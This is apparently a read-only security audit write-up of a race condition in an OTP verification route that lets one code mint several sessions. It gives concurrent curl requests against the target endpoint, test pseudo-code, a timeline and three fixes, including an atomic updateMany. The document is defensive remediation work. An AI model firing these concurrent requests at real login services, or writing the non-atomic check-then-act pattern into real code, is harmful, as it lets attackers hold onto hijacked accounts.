# OTP Verification Race Condition — Proof of Concept

## Vulnerability

**Type:** Race Condition in OTP Consumption  
**File:** `app/api/v1/auth/phone/verify-otp/route.ts`  
**Lines:** 48-123  
**Severity:** 🔴 CRITICAL

## Root Cause

Non-atomic check-then-act pattern:

```typescript
// Step 1: Read challenge (line 48)
const challenge = await prisma.otpChallenge.findUnique({
  where: { id: challengeId },
})

// Step 2: Check if consumed (line 61)
if (challenge.consumedAt) {
  return error
}

// Step 3: Check expiry (line 72)
if (challenge.expiresAt < new Date()) {
  return error
}

// Step 4: Check attempts (line 83)
if (challenge.attempts >= OTP_CONFIG.MAX_ATTEMPTS) {
  return error
}

// Step 5: Verify password (line 93)
const isValid = await verifyPassword(code, challenge.codeHash)

// Step 6: Mark as consumed (line 116)
await prisma.otpChallenge.update({
  where: { id: challengeId },
  data: { consumedAt: new Date() },
})

// Step 7: Create session (line 192)
const sessionData = await SessionService.createSession(user.id, {...})
```

**Problem:**
- Steps 1-6 are NOT atomic
- Two concurrent requests can both see `consumedAt = null`
- Both can pass all checks
- Both can mark as consumed (last write wins, but both succeed)
- Both create separate sessions

---

## Attack Scenario

### Prerequisites
- Attacker has valid OTP code (e.g., stolen from SMS)
- challengeId is known (from request-otp response)
- code is correct 6-digit OTP

### Attack Steps

```bash
# Step 1: Attacker sends 2 concurrent requests with same OTP

curl -X POST http://api.forum.kg/api/v1/auth/phone/verify-otp \
  -H "Content-Type: application/json" \
  -d '{"challengeId": "uuid-here", "code": "123456"}' &

curl -X POST http://api.forum.kg/api/v1/auth/phone/verify-otp \
  -H "Content-Type: application/json" \
  -d '{"challengeId": "uuid-here", "code": "123456"}' &
```

### Expected Outcome (Current Implementation)

```
Request 1:
  - findUnique: consumedAt = null ✓
  - Check consumed: PASS ✓
  - Verify OTP: PASS ✓
  - UPDATE consumedAt = 2024-11-21T10:00:01Z
  - Create Session A
  - Response: 200 OK with refresh_token_A

Request 2:
  - findUnique: consumedAt = null ✓ (before Request 1 updated)
  - Check consumed: PASS ✓
  - Verify OTP: PASS ✓
  - UPDATE consumedAt = 2024-11-21T10:00:01Z (overwrites)
  - Create Session B
  - Response: 200 OK with refresh_token_B
```

**Result:**
- ✅ 2 successful responses
- ✅ 2 active sessions (Session A and Session B)
- ✅ 2 refresh tokens issued
- ❌ Single OTP used twice

---

## Exploitation Impact

### Scenario 1: Session Persistence Attack

1. Victim receives OTP via SMS
2. Attacker steals OTP (e.g., SIM swap, phishing)
3. Attacker sends 2 concurrent verification requests
4. Gets 2 separate sessions (Session A and Session B)
5. Victim logs in normally, gets Session C
6. Victim performs logout → only Session C revoked
7. **Attacker still has Session A and Session B active**

### Scenario 2: Multi-Device Persistence

1. Attacker gets valid OTP
2. Creates 10 concurrent requests
3. May get 5-10 successful sessions (depending on timing)
4. Each session has separate refresh token
5. Logout-all required to revoke all (but victim may not know)

### Scenario 3: Bypass Rate Limiting

While not directly rate-limiting bypass, attacker can:
1. Request OTP (uses 1 of 3 rate-limit slots)
2. Receive valid OTP
3. Create multiple sessions from single OTP
4. Effectively bypasses "1 OTP = 1 session" assumption

---

## Timeline Analysis

```
T0:  Request 1 starts
T1:  Request 1: SELECT * FROM OtpChallenge WHERE id = ?
     → consumedAt = NULL, attempts = 0
     
T5:  Request 2 starts
T6:  Request 2: SELECT * FROM OtpChallenge WHERE id = ?
     → consumedAt = NULL, attempts = 0  (same data!)
     
T10: Request 1: IF consumedAt IS NULL → TRUE (proceed)
T11: Request 2: IF consumedAt IS NULL → TRUE (proceed)

T15: Request 1: bcrypt.compare(code, hash) → TRUE
T16: Request 2: bcrypt.compare(code, hash) → TRUE

T20: Request 1: UPDATE OtpChallenge SET consumedAt = NOW()
     → consumedAt = 2024-11-21T10:00:20
     
T21: Request 2: UPDATE OtpChallenge SET consumedAt = NOW()
     → consumedAt = 2024-11-21T10:00:21  (overwrites T20)
     
T25: Request 1: INSERT INTO Session (...)
     → Session A created
     
T26: Request 2: INSERT INTO Session (...)
     → Session B created
     
T30: Request 1: HTTP 200 OK (success)
T31: Request 2: HTTP 200 OK (success)
```

**Key observation:**
Both requests see `consumedAt = NULL` because SELECT happens before any UPDATE.

---

## Likelihood Assessment

**Factors:**

1. **Network latency:** 
   - Requests must arrive within ~100ms window
   - Very feasible for attacker with script

2. **Database performance:**
   - PostgreSQL SELECT is fast (~1ms)
   - bcrypt.compare is slow (~100-500ms)
   - Wide race window

3. **Attacker capability:**
   - Simple: 2 concurrent curl requests
   - No advanced tooling needed

**Overall likelihood:** 🔴 HIGH

---

## Test Plan (NOT EXECUTED — READ-ONLY AUDIT)

### Test Case 1: Basic Concurrent Verification

```typescript
// Pseudo-code for test (DO NOT RUN)
async function testConcurrentVerification() {
  // Setup: Get valid OTP
  const otpResponse = await requestOTP('+996555000001', 'LOGIN')
  const challengeId = otpResponse.challengeId
  const otpCode = '123456' // Retrieved from DB or SMS
  
  // Attack: Send 2 concurrent verification requests
  const [result1, result2] = await Promise.all([
    verifyOTP(challengeId, otpCode),
    verifyOTP(challengeId, otpCode),
  ])
  
  // Expected (vulnerable): Both succeed
  console.log('Request 1:', result1.status) // 200
  console.log('Request 2:', result2.status) // 200
  
  // Check sessions created
  const sessions = await getSessions(userId)
  console.log('Active sessions:', sessions.length) // Expected: 2
  
  // Verdict
  if (sessions.length > 1) {
    console.log('❌ VULNERABLE: Multiple sessions from one OTP')
  }
}
```

### Test Case 2: Extreme Concurrency

```typescript
// Test with 10 concurrent requests
async function testExtremeConcurrency() {
  const promises = Array.from({ length: 10 }, () =>
    verifyOTP(challengeId, otpCode)
  )
  
  const results = await Promise.all(promises)
  const successes = results.filter(r => r.status === 200)
  
  console.log(`Successes: ${successes.length} / 10`)
  // Expected (vulnerable): 5-10 successes
}
```

### Test Case 3: Attempts Limit Bypass

```typescript
// Test if concurrent wrong attempts can exceed limit
async function testAttemptsLimitBypass() {
  const wrongCode = '000000'
  
  // Send 6 concurrent requests with wrong OTP
  const promises = Array.from({ length: 6 }, () =>
    verifyOTP(challengeId, wrongCode)
  )
  
  const results = await Promise.all(promises)
  
  // Check final attempts count
  const challenge = await getChallenge(challengeId)
  console.log('Final attempts:', challenge.attempts)
  
  // Expected: 6 (correct, atomic increment works)
  // But: Some requests may succeed before limit is hit
}
```

---

## Comparison with Other Endpoints

### request-otp (FIXED with Serializable)

```typescript
// request-otp uses Serializable isolation
const challenge = await prisma.$transaction(
  async (tx) => {
    const count = await tx.otpChallenge.count(...) // Atomic check
    if (count >= 3) throw error
    await tx.otpChallenge.create(...) // Atomic create
  },
  { isolationLevel: 'Serializable' } // ← FIX
)
```

**Why it's safe:**
- Serializable isolation detects conflicts
- Only 3 transactions can commit
- Others get P2034 and retry

### verify-otp (VULNERABLE — no transaction)

```typescript
// verify-otp does NOT use transaction
const challenge = await prisma.otpChallenge.findUnique(...) // Read
if (challenge.consumedAt) return error                      // Check
await prisma.otpChallenge.update(...)                       // Update (separate!)
```

**Why it's vulnerable:**
- No transaction wrapping check + update
- Read Committed isolation (default)
- Multiple reads see same initial state

---

## Recommendations

### Fix 1: Atomic Update with WHERE Clause (RECOMMENDED)

```typescript
// Use updateMany with WHERE consumedAt IS NULL
const consumed = await prisma.otpChallenge.updateMany({
  where: {
    id: challengeId,
    consumedAt: null,  // ← Only update if not already consumed
  },
  data: {
    consumedAt: new Date(),
  },
})

if (consumed.count === 0) {
  // Either already consumed or not found
  return NextResponse.json({
    error: { code: 'OTP_ALREADY_USED', message: '...' }
  }, { status: 400 })
}

// Proceed with session creation
```

**Advantages:**
- ✅ Single atomic operation
- ✅ No transaction overhead
- ✅ No P2034 errors
- ✅ Minimal code change

**Disadvantages:**
- ⚠️ Can't distinguish "not found" from "already consumed"
- ⚠️ Need separate query if we need challenge data

---

### Fix 2: Serializable Transaction (Alternative)

```typescript
const result = await prisma.$transaction(
  async (tx) => {
    const challenge = await tx.otpChallenge.findUnique({
      where: { id: challengeId },
    })
    
    if (!challenge) throw error
    if (challenge.consumedAt) throw error
    
    // ... all checks ...
    
    await tx.otpChallenge.update({
      where: { id: challengeId },
      data: { consumedAt: new Date() },
    })
    
    // ... create session ...
    
    return result
  },
  { isolationLevel: 'Serializable', timeout: 10000 }
)
```

**Advantages:**
- ✅ Guaranteed atomicity
- ✅ Can include all logic in transaction

**Disadvantages:**
- ❌ P2034 errors under concurrency
- ❌ Need retry logic
- ❌ Higher latency
- ❌ More complex code

---

### Fix 3: Database Constraint (Defense in Depth)

```sql
-- Add partial UNIQUE index
CREATE UNIQUE INDEX idx_otp_not_consumed 
ON "OtpChallenge" (id) 
WHERE "consumedAt" IS NULL;
```

**Purpose:** Prevents multiple updates with consumedAt=NULL

**Advantages:**
- ✅ Database-level guarantee
- ✅ Defense in depth

**Disadvantages:**
- ❌ Requires migration
- ❌ Doesn't solve race condition (still need Fix 1 or 2)
- ❌ Only prevents DB inconsistency, not application logic issues

---

## Summary

**Vulnerability confirmed:** 🔴 YES  
**Exploitability:** 🔴 HIGH (simple concurrent requests)  
**Impact:** 🔴 CRITICAL (multiple sessions from one OTP)  
**Recommended fix:** Fix 1 (atomic updateMany with WHERE)

